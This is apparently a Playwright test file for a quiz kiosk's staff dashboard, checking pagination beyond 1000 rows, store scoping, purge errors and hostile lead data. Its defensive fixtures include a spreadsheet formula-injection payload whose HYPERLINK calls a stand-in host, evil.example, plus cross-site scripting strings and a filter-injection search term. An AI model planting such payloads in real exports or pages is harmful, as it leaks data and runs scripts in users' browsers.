import { test, expect, type Page } from "@playwright/test";
import fs from "node:fs";
import { MockBackend, seedTables, type Row } from "./support/mock-backend";
import { appErrors, boot, BROKEN_TEXT } from "./support/kiosk";
import { sampleSessions, signInAs } from "./support/staff";

// The staff areas against a backend with MORE data than one request can carry (PostgREST answers
// at most 1000 rows) and with customer-supplied text that tries to be clever. Signed in as each
// role through an already MFA-verified session; nothing here comes from production.

test.use({ serviceWorkers: "block", viewport: { width: 1366, height: 1024 } });
test.describe.configure({ timeout: 90_000 });

const N = 2500;

/** What the numbers on screen must be, computed straight from the seeded rows. */
function expected(rows: Row[], now = Date.now()) {
  const ageMin = (r: Row) => (now - Date.parse(r.created_at)) / 60_000;
  return {
    all: rows.length,
    sent: rows.filter((r) => r.email_sent).length,
    processing: rows.filter((r) => !r.email_sent && ageMin(r) < 5).length,
    noEmail: rows.filter((r) => !r.email_sent && ageMin(r) >= 5 && r.discount_code).length,
    failed: rows.filter((r) => !r.email_sent && ageMin(r) >= 5 && !r.discount_code).length,
  };
}

async function openManager(page: Page, backend: MockBackend, role: "manager" | "consulente_responsabile" = "manager", store: string | null = null) {
  await signInAs(page, backend, role, store);
  const booted = await boot(page, { backend, storeId: store ?? "milano" });
  await page.goto("/manager", { waitUntil: "domcontentloaded" });
  await expect(page.getByRole("button", { name: /Sessions & Codes/ })).toBeVisible({ timeout: 20_000 });
  return booted;
}

const withSessions = (rows: Row[]) => {
  const tables = seedTables();
  tables.quiz_sessions = rows;
  return new MockBackend(tables);
};

test.describe("manager · sessions", () => {
  test("every total is exact beyond 1000 rows, and the status buttons agree with the lists they open", async ({ page }) => {
    const rows = sampleSessions(N);
    const exp = expected(rows);
    const backend = withSessions(rows);
    const { errors } = await openManager(page, backend);
    await page.getByRole("button", { name: /Sessions & Codes/ }).click();

    await expect(page.getByRole("button", { name: `All (${exp.all})` })).toBeVisible({ timeout: 20_000 });
    await expect(page.getByRole("button", { name: `Sent (${exp.sent})` })).toBeVisible();
    await expect(page.getByRole("button", { name: `Processing (${exp.processing})` })).toBeVisible();
    await expect(page.getByRole("button", { name: `No email (${exp.noEmail})` })).toBeVisible();
    await expect(page.getByRole("button", { name: `Failed (${exp.failed})` })).toBeVisible();
    await expect(page.getByText(`${exp.all} sessions · page 1 of ${Math.ceil(exp.all / 20)}`)).toBeVisible();

    // the KPIs were read in pages of 1000: three requests for 2500 rows
    const kpiReads = backend.calls("/rest/v1/quiz_sessions", "GET").filter((r) => r.query.includes("select=id%2Cemail_sent"));
    expect(kpiReads.length).toBeGreaterThanOrEqual(3);

    // "Failed" is a database filter: the pager and the total follow it, whichever page the rows were on
    await page.getByRole("button", { name: `Failed (${exp.failed})` }).click();
    await expect(page.getByText(`${exp.failed} sessions · filter: failed · page 1 of ${Math.ceil(exp.failed / 20)}`)).toBeVisible({ timeout: 15_000 });
    await expect(page.getByText("FAILED").first()).toBeVisible();
    await expect(page.getByText("SENT", { exact: true })).toHaveCount(0);

    expect(BROKEN_TEXT.test(await page.locator("body").innerText())).toBe(false);
    expect(appErrors(errors)).toEqual([]);
  });

  test("the CSV export contains every lead, and no cell can run as a formula", async ({ page }) => {
    const rows = sampleSessions(N);
    // a hostile lead written straight through the API, bypassing the kiosk's form
    Object.assign(rows[5], { nome: '=HYPERLINK("http://evil.example/?"&A2,"click")', cognome: "+SUM(1)", product_name: "@cmd" });
    const backend = withSessions(rows);
    await openManager(page, backend);
    await page.getByRole("button", { name: /Sessions & Codes/ }).click();
    await expect(page.getByRole("button", { name: `All (${N})` })).toBeVisible({ timeout: 20_000 });

    const [download] = await Promise.all([page.waitForEvent("download"), page.getByRole("button", { name: "Export CSV" }).click()]);
    const csv = fs.readFileSync(await download.path(), "utf8").replace(/^﻿/, "");
    const lines = csv.split("\r\n");
    expect(lines).toHaveLength(N + 1); // header + every lead — not the first 1000
    expect(csv).not.toMatch(/(^|,)"[=+\-@]/m); // no cell starts with a formula character
    expect(csv).toContain('"\t=HYPERLINK(');
    expect(csv).toContain("lead2499@example.com");
  });

  test("searching for text full of query syntax does not break the list", async ({ page }) => {
    const backend = withSessions(sampleSessions(60));
    await openManager(page, backend);
    await page.getByRole("button", { name: /Sessions & Codes/ }).click();
    const search = page.getByPlaceholder(/search/i).first();
    await expect(search).toBeVisible({ timeout: 15_000 });
    await search.fill('Smith (Jr), "x"%_');
    // the filter that reaches the database: four conditions, each value inside its own quotes
    const orFilter = () => {
      const hit = backend.calls("/rest/v1/quiz_sessions", "GET").map((r) => new URLSearchParams(r.query).get("or")).filter(Boolean).at(-1);
      return hit ?? null;
    };
    await expect.poll(orFilter, { timeout: 10_000 }).not.toBeNull();
    const conditions: string[] = [];
    let depth = 0, quoted = false, cur = "";
    const inner = orFilter()!.replace(/^\(|\)$/g, "");
    for (let i = 0; i < inner.length; i++) {
      const c = inner[i];
      if (quoted && c === "\\") { cur += c + inner[++i]; continue; }
      if (c === '"') quoted = !quoted;
      if (!quoted && c === ",") { conditions.push(cur); cur = ""; continue; }
      cur += c; depth += 0;
    }
    conditions.push(cur);
    expect(quoted, "an unbalanced quote would let the term change the filter").toBe(false);
    expect(conditions.map((c) => c.split(".ilike.")[0])).toEqual(["email", "discount_code", "nome", "cognome"]);
    for (const c of conditions) expect(c).toMatch(/^[a-z_]+\.ilike\.".*"$/);
    await expect(page.getByTestId("error-boundary")).toHaveCount(0);
  });

  test("a store responsible only ever asks for their own store — and purges only that one", async ({ page }) => {
    const rows = sampleSessions(300);
    const backend = withSessions(rows);
    backend.rpc.set("purge_sessions_older_than", () => 7);
    await openManager(page, backend, "consulente_responsabile", "milano");
    await expect(page.getByRole("button", { name: /Management/ })).toHaveCount(0); // no Management tab for this role
    await page.getByRole("button", { name: /Sessions & Codes/ }).click();
    await expect(page.getByRole("button", { name: /^All \(/ })).toBeVisible({ timeout: 20_000 });
    for (const r of backend.calls("/rest/v1/quiz_sessions", "GET")) {
      expect(decodeURIComponent(r.query), `${r.query}`).toContain("store_id=eq.milano");
    }
    await page.getByRole("button", { name: /Delete > 7d old/ }).click();
    await page.getByRole("button", { name: /^Delete|Confirm/i }).last().click();
    await expect.poll(() => backend.calls("rpc/purge_sessions_older_than").length, { timeout: 10_000 }).toBe(1);
    expect(backend.calls("rpc/purge_sessions_older_than")[0].body).toEqual({ p_days: 7, p_store_id: "milano" });
  });

  test("a failing purge says so instead of announcing '0 sessions deleted'", async ({ page }) => {
    const backend = withSessions(sampleSessions(100));
    backend.fail("rpc/purge_sessions_older_than", { kind: "status", status: 403, body: { code: "42501", message: "forbidden: caller is not a manager" } });
    await openManager(page, backend);
    await page.getByRole("button", { name: /Sessions & Codes/ }).click();
    await page.getByRole("button", { name: /Delete > 7d old/ }).click();
    await page.getByRole("button", { name: /^Delete|Confirm/i }).last().click();
    await expect(page.getByText(/Could not delete the old sessions/)).toBeVisible({ timeout: 10_000 });
    await expect(page.getByText(/sessions deleted successfully/)).toHaveCount(0);
  });
});

test.describe("stats", () => {
  test("totals beyond 1000 sessions, and a funnel that follows the selected store", async ({ page }) => {
    const rows = sampleSessions(N);
    const backend = withSessions(rows);
    // funnel events: milano converts 3 of 4 results, lisboa 1 of 4
    const events = (store: string, started: number, shown: number, claimed: number) => [
      ...Array.from({ length: started }, () => ({ funnel_key: crypto.randomUUID(), event_type: "quiz_started", store_id: store, created_at: new Date().toISOString() })),
      ...Array.from({ length: shown }, () => ({ funnel_key: crypto.randomUUID(), event_type: "result_shown", store_id: store, created_at: new Date().toISOString() })),
      ...Array.from({ length: claimed }, () => ({ funnel_key: crypto.randomUUID(), event_type: "claimed", store_id: store, created_at: new Date().toISOString() })),
    ];
    backend.tables.quiz_funnel_events = [...events("milano", 5, 4, 3), ...events("lisboa", 5, 4, 1)];
    await signInAs(page, backend, "manager");
    const { errors } = await boot(page, { backend });
    await page.goto("/stats", { waitUntil: "domcontentloaded" });

    await expect(page.getByText("TOTAL SESSIONS")).toBeVisible({ timeout: 20_000 });
    await expect(page.getByText(String(N), { exact: true }).first()).toBeVisible();
    await expect(page.getByText("Claim rate", { exact: true })).toBeVisible();
    await expect(page.getByText("4 / 8")).toBeVisible(); // every store: 4 claimed of 8 results shown

    // pick one store: the sessions AND the funnel follow it
    await page.getByRole("button", { name: "Filter" }).first().click();
    await page.getByRole("button", { name: "Milano", exact: true }).click();
    await expect(page.getByText("3 / 4")).toBeVisible({ timeout: 10_000 });
    const funnelReads = backend.calls("/rest/v1/quiz_funnel_events").filter((r) => r.query.includes("store_id=eq.milano"));
    expect(funnelReads.length).toBeGreaterThanOrEqual(3);
    expect(BROKEN_TEXT.test(await page.locator("body").innerText())).toBe(false);
    expect(appErrors(errors)).toEqual([]);
  });

  test("a store that has 1,200 sessions is charted completely (50 000-row cap not reached, no warning)", async ({ page }) => {
    const backend = withSessions(sampleSessions(1200));
    await signInAs(page, backend, "manager");
    await boot(page, { backend });
    await page.goto("/stats", { waitUntil: "domcontentloaded" });
    await expect(page.getByText("TOTAL SESSIONS")).toBeVisible({ timeout: 20_000 });
    await expect(page.getByText("1200", { exact: true }).first()).toBeVisible();
    await expect(page.getByText(/More sessions exist than can be charted/)).toHaveCount(0);
  });
});

test.describe("reset password", () => {
  test("the page is in English like the rest of the staff UI", async ({ page }) => {
    await boot(page);
    await page.goto("/reset-password", { waitUntil: "domcontentloaded" });
    await expect(page.getByRole("heading", { name: "New password" })).toBeVisible();
    const text = await page.locator("body").innerText();
    expect(text).not.toMatch(/Nuova|Verifica|Salva|Conferma|password dimenticata/i);
  });
});

test.describe("every staff area survives hostile and missing data", () => {
  test("leads with no name, huge names, emoji and markup render as text", async ({ page }) => {
    const rows = sampleSessions(30);
    Object.assign(rows[1], { nome: null, cognome: null });
    Object.assign(rows[2], { nome: "N".repeat(100), cognome: "S".repeat(100) });
    Object.assign(rows[3], { nome: "<img src=x onerror=window.__pwned=1>", cognome: "<script>window.__pwned=1</script>", product_name: "<b onmouseover=window.__pwned=1>x</b>" });
    Object.assign(rows[4], { nome: "😀🎉", cognome: "‮RTL‬", email: "weird+tag@sub.example.co.uk" });
    const backend = withSessions(rows);
    await openManager(page, backend);
    await page.getByRole("button", { name: /Sessions & Codes/ }).click();
    await expect(page.getByText("lead2@example.com")).toBeVisible({ timeout: 20_000 });
    expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned)).toBeUndefined();
    await page.goto("/stats", { waitUntil: "domcontentloaded" });
    await expect(page.getByText("TOTAL SESSIONS")).toBeVisible({ timeout: 20_000 });
    expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned)).toBeUndefined();
    await expect(page.getByTestId("error-boundary")).toHaveCount(0);
  });

  test("the backend answering 500 to everything shows an error state, not a crash", async ({ page }) => {
    const backend = withSessions(sampleSessions(50));
    backend.fail(/\/rest\/v1\/quiz_(sessions|funnel_events)/, { kind: "status", status: 500 });
    await signInAs(page, backend, "manager");
    await boot(page, { backend });
    await page.goto("/stats", { waitUntil: "domcontentloaded" });
    await expect(page.getByText(/Unable to load data/)).toBeVisible({ timeout: 20_000 });
    await expect(page.getByTestId("error-boundary")).toHaveCount(0);
  });
});
